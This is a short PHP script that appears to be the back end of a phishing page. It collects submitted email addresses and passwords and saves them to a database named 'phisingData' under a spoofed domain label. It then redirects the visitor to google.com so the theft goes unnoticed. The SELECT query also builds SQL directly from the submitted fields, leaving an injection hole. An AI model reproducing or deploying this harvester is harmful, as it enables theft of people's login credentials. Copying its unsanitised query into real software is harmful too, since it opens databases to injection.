<?php

if (isset($_POST["email"], $_POST["password"])) {
    $conn = new mysqli("localhost", "root", "root", "phisingData");

    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    $domain = "https://booga.com";
    $email = $_POST["email"];
    $password = $_POST["password"];

    $sql = "SELECT * FROM datasets WHERE domain='$domain' AND email='$email' AND password='$password'";
    $result = $conn->query($sql);

    if ($result->num_rows == 0) {
        $stmt = $conn->prepare("INSERT INTO datasets (domain, email, password) VALUES (?, ?, ?)");
        $stmt->bind_param("sss", $domain, $email, $password);

        $stmt->execute();
    }

    header("Location: https://www.google.com/");
}